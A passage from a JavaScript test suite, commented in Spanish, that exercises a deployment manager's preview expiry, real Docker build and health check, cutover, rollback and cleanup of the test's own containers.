  await assert.rejects(() => push1, (e) => e && e.code === 'PREVIEW_SUPERSEDED');
  const p2 = await push2;
  assert.strictEqual(firstAborted, true, 'El push #2 debe abortar el build obsoleto del push #1');
  assert.strictEqual(p2.status, 'active');
  assert.strictEqual(p2.commit, 'bbbb002');

  // 5. reapExpired() limpia vistas previas expiradas
  pm.store['proj_prev_1']['pr-42'].expiresAt = new Date(Date.now() - 1000).toISOString();
  const reaped = await pm.reapExpired();
  assert.strictEqual(reaped, 1);
  assert.strictEqual(pm.get('proj_prev_1', 'pr-42'), null);

  console.log('  ✓ PreviewManager: baseDomain RFC-1123, scoped envVars/buildSecrets, PR-close 0 huérfanos, supersede y TTL reaper');
}

// ---------------------------------------------------------------------------
// 11. Camino real, si hay un daemon de Docker
// ---------------------------------------------------------------------------
async function testRealDockerDeploy() {
  const docker = await deployManagerSingleton.detectDocker({ force: true });
  if (!docker.available) {
    console.log(`  ⏭  Despliegue real omitido: ${docker.reason}`);
    console.log('     Para ejecutarlo: arranca Docker y repite.');
    return;
  }
  console.log(`  ✓ Docker detectado (servidor ${docker.version}); ejecutando el despliegue real`);

  const dm = new DeployManager();
  dm.store = {};
  dm.saveStore = () => {};
  dm.notify = () => {};

  const projectId = `test_deploy_${Date.now().toString(36)}`;
  const contextDir = fixture('real', {
    'index.html': '<!doctype html><html lang="es"><head><meta charset="utf-8"><title>ok</title></head><body><h1>Culkibo</h1></body></html>'
  });

  // Sin dominios: se construye, se arranca y se verifica la salud, pero no se
  // toca el ingress. Así la prueba no depende de que haya un Caddy delante.
  const project = { id: projectId, name: 'Despliegue de prueba', domains: [], envVars: { CULKIBO_TEST: 'si' } };

  let deployment;
  try {
    deployment = await dm.deploy(project, {
      contextDir,
      healthTimeoutMs: 60000,
      buildTimeoutMs: 8 * 60 * 1000,
      drainTimeoutMs: 100,
      stopGraceSeconds: 1
    });

    assert.strictEqual(deployment.status, 'activo', `El despliegue real falló: ${deployment.error}`);
    assert.strictEqual(deployment.strategy.stack, 'static');
    assert.ok(deployment.containerName);
    console.log(`  ✓ Imagen construida y contenedor sano: ${deployment.imageTag}`);

    // El servicio responde de verdad en el puerto publicado.
    const res = await fetch(`http://127.0.0.1:${deployment.hostPort}/`, { signal: AbortSignal.timeout(5000) });
    assert.strictEqual(res.status, 200);
    assert.ok((await res.text()).includes('Culkibo'), 'El contenido servido es el del proyecto');
    console.log('  ✓ El contenedor sirve el contenido real por su puerto publicado');

    // El contenedor tiene política de reinicio y límites aplicados de verdad.
    const inspect = await dm.runDocker(
      ['inspect', '-f', '{{.HostConfig.RestartPolicy.Name}}|{{.HostConfig.Memory}}|{{.State.Running}}', deployment.containerName],
      { timeoutMs: 10000 }
    );
    const [policy, memory, running] = inspect.stdout.trim().split('|');
    assert.strictEqual(policy, 'unless-stopped', 'Debe ser un servicio durable, no un proceso suelto');
    assert.strictEqual(running, 'true');
    assert.ok(Number(memory) > 0, 'El límite de memoria debe estar aplicado');
    console.log(`  ✓ Servicio durable: restart=${policy}, memoria=${Math.round(Number(memory) / 1048576)} MB`);

    // Un segundo despliegue: cutover real con el primero todavía vivo.
    const second = await dm.deploy(project, {
      contextDir,
      healthTimeoutMs: 60000,
      buildTimeoutMs: 8 * 60 * 1000,
      drainTimeoutMs: 100,
      stopGraceSeconds: 1
    });
    assert.strictEqual(second.status, 'activo', `El segundo despliegue falló: ${second.error}`);
    assert.notStrictEqual(second.containerName, deployment.containerName);
    assert.strictEqual(dm.store[projectId].previous.containerName, deployment.containerName, 'El anterior queda como ancla de rollback');
    await dm.awaitDrain(projectId);
    console.log('  ✓ Segundo despliegue: cutover con drenaje y el anterior conservado');

    // Rollback real.
    const rolled = await dm.rollback(projectId, { healthTimeoutMs: 60000, drainTimeoutMs: 100, stopGraceSeconds: 1 });
    assert.strictEqual(rolled.status, 'activo', `El rollback real falló: ${rolled.error}`);
    assert.strictEqual(dm.store[projectId].current.containerName, deployment.containerName);
    await dm.awaitDrain(projectId);
    console.log('  ✓ Rollback real: vuelve a la versión anterior sin reconstruir');
  } finally {
    // Limpieza: contenedores por etiqueta e imágenes por nombre.
    try {
      const list = await dm.runDocker(['ps', '-aq', '--filter', `label=com.culkibo.project=${safeSlug(projectId)}`], { timeoutMs: 15000 });
      for (const id of (list.stdout || '').split(/\r?\n/).map(s => s.trim()).filter(Boolean)) {
        await dm.runDocker(['rm', '-f', id], { timeoutMs: 20000 });
      }
      const images = await dm.runDocker(['images', '-q', `culkibo/${safeSlug(projectId)}`], { timeoutMs: 15000 });
      for (const id of new Set((images.stdout || '').split(/\r?\n/).map(s => s.trim()).filter(Boolean))) {
        await dm.runDocker(['rmi', '-f', id], { timeoutMs: 30000 });
      }
      console.log('  ✓ Recursos de la prueba eliminados');
    } catch (e) {
      console.warn(`  ⚠ Limpieza incompleta: ${e.message}`);
    }
  }
}

module.exports = testDeploy;

if (require.main === module) {
  testDeploy().catch(err => {
    console.error('❌ Fallo en las pruebas del desplegador:', err);
    process.exit(1);
  });
}
